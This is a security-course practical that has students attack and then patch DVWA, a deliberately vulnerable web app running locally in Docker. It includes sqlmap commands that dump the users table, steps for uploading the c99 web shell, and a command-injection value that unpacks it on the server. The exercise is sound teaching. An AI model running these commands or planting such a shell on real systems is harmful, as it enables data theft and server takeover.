Damn Vulnerable Web Application (DVWA)
======================================

In today's practical, you will be given an application. A pretty damn vulnerable
one.

**Your mission**: find, exploit and eventually fix as much vulnerabilities as you
can!

As the application will be running in a Docker container with its own webserver
and database, the isolation level provided by the container should be sufficient
for you to feel free to attack the application in any way you want!

## Setup

Clone [DVWA](https://github.com/K-Phoen/dvwa) and follow the instructions in the
README to get it running.

Once the container is up and running, **setup the database** and use the
credentials "**admin/password**" to log in.

The **security level of the application can be changed** to low, medium or high.
Follow the "DVWA Security" link in the sidebar and choose the desired level
(*low* is probably a good choice to start).

More information on the application is available here: http://www.dvwa.co.uk/
The source is also committed on the DVWA repository, in the `dvwa-1.0.8`
directory.

**Note:** a few interesting tools are also provided in this repository…

## ATTACK!

Different type of **vulnerabilities are listed in the sidebar**, each entry
linking to a vulnerable page.

**For each vulnerability** type, you should be able to **exploit it** when the
security level is configured to "low". For more challenge, feel free to raise
the security level.

Attacking web applications is one thing. Learning how to protect yourself from
such attacks is another one.

Now that you successfully attacked this application, **try to make it more secure!**

**Note:** feel secure enough? Share your patched application with other students
and tell them to break it if they can!

### Tools

A couple of tools are provided in the [dvwa repository](https://github.com/K-Phoen/dvwa).

Internet is full of such tools (if you search in the right places, you might
even be able to find tools built by the NSA but stolen by hackers…).

In this practical, you will use two famous ones: sqlmap and c99 shell.

#### sqlmap

[sqlmap](http://sqlmap.org/) is an open source penetration testing tool that
automates the process of detecting and exploiting SQL injection flaws and taking
over of database servers.

Their [user guide](https://github.com/sqlmapproject/sqlmap/wiki/Introduction)
is a nice entry point to learn how the tool works.

For the lazy ones, here is a list of useful command lines:

<details>
    <summary><strong>List databases</strong></summary>

    ./sqlmap/sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" --dbs
</details>

<details>
    <summary><strong>List tables</strong></summary>

    ./sqlmap/sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa --tables
</details>

<details>
    <summary><strong>List columns</strong></summary>

    ./sqlmap/sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa -T users --columns
</details>

<details>
    <summary><strong>Dump data</strong></summary>

    ./sqlmap/sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa -T users --dump
</details>

**Note:** the last command is able to dump a list of encrypted user password and
display them as plain text. How is this possible? Suggest a fix to prevent this.

A [full usage guide](https://github.com/sqlmapproject/sqlmap/wiki/Usage) can be
found on their wiki.

#### c99

[c99](https://github.com/K-Phoen/dvwa/raw/master/exploits/c99.php.gz) is a
well-known and powerful web-based shell.

In order to use it, you have to:
1. upload it on the server;
2. access the uploaded file to execute the shell.

<details>
<summary><strong>Possible solution</strong></summary>

<ol>
    <li>Upload the exploit (.gz), then look at: <a href="http://localhost:8080/hackable/uploads/">http://localhost:8080/hackable/uploads/</a></li>
    <li>Uncompress the archive using a command executionvulerability: <code>; /bin/gunzip -v ../../hackable/uploads/c99.php</code></li>
</ol>
</details>
